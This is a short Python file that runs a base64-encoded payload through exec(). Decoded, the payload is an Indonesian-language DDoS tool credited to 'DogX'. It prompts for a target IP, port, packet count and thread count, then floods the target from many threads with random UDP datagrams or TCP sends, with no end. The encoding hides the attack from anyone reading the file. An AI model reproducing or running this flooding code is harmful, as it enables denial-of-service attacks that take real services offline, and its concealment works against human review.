import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMw0KI0thZ2FrIFVzYWggUmVuYW1lIEJZIEJ5IERvZ1ggDQojRGRvcyBieSBEb2dYIHwgU1VCU0NSSUJFIFRPRCBDSEFOTkVMIERvZ3gNCmltcG9ydCByYW5kb20NCmltcG9ydCBzb2NrZXQNCmltcG9ydCB0aHJlYWRpbmcNCmltcG9ydCBvcw0KDQpvcy5zeXN0ZW0oImNsZWFyIikNCnByaW50KCJCYW51IE5pIEJvcyIpDQpwcmludCgiVGVtYnVzIERvbmcgS29udG9sIikNCmlwID0gc3RyKGlucHV0KCIgSXA6ICIpKQ0KcG9ydCA9IGludChpbnB1dCgiIFBvcnQ6ICIpKQ0KY2hvaWNlID0gc3RyKGlucHV0KCIgR2FzcyBLaXJpbSBQYWtldD8hISh5L24pOiAiKSkNCnRpbWVzID0gaW50KGlucHV0KCIgUGFrZXQgWWFuZyBNYXUgTHUga2lyaW06ICIpKQ0KdGhyZWFkcyA9IGludChpbnB1dCgiIFRoZWFyZHM6ICIpKQ0KZGVmIHJ1bigpOg0KICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDEwMjQpDQogIGkgPSByYW5kb20uY2hvaWNlKCgiWypdIiwiWyFdIiwiWyNdIikpDQogIHdoaWxlIFRydWU6DQogICAgdHJ5Og0KICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQ0KICAgICAgYWRkciA9IChzdHIoaXApLGludChwb3J0KSkNCiAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToNCiAgICAgICAgcy5zZW5kdG8oZGF0YSxhZGRyKQ0KICAgICAgcHJpbnQoaSArIiB8IFBFUk1JU0kgUEFLRVQhISF8IikNCiAgICBleGNlcHQ6DQogICAgICBwcmludCgiWyFdIHwgUEVSTUlTSSBQQUtFVCEhIHwiKQ0KDQpkZWYgcnVuMigpOg0KICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDE2KQ0KICBpID0gcmFuZG9tLmNob2ljZSgoIlsqXSIsIlshXSIsIlsjXSIpKQ0KICB3aGlsZSBUcnVlOg0KICAgIHRyeToNCiAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgICBzLmNvbm5lY3QoKGlwLHBvcnQpKQ0KICAgICAgcy5zZW5kKGRhdGEpDQogICAgICBmb3IgeCBpbiByYW5nZSh0aW1lcyk6DQogICAgICAgIHMuc2VuZChkYXRhKQ0KICAgICAgcHJpbnQoaSArIiBNQU5UQVAgS0FXQU4hISEiKQ0KICAgIGV4Y2VwdDoNCiAgICAgIHMuY2xvc2UoKQ0KICAgICAgcHJpbnQoIlsqXSBEb3duIikNCg0KZm9yIHkgaW4gcmFuZ2UodGhyZWFkcyk6DQogIGlmIGNob2ljZSA9PSAneSc6DQogICAgdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IHJ1bikNCiAgICB0aC5zdGFydCgpDQogIGVsc2U6DQogICAgdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IHJ1bjIpDQogICAgdGguc3RhcnQoKQ=='))